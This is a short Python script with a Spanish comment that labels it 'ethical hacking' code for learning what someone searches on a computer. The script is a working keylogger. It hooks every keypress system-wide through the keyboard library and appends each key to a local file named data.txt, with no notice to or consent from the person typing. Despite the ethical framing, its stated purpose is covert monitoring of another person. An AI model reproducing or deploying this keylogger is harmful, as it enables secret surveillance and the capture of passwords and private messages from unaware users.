# CODIGO DE HACING ETICO PARA SABER LO QUE SE BUSCA EN UNA COMPUTADORA "SU HISTORIAL DE BUSQUEDA"
# pip install keyboard

import keyboard

def pressedkeys(key):
    
    with open('data.txt', 'a') as file:
        
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(pressedkeys)
keyboard.wait()

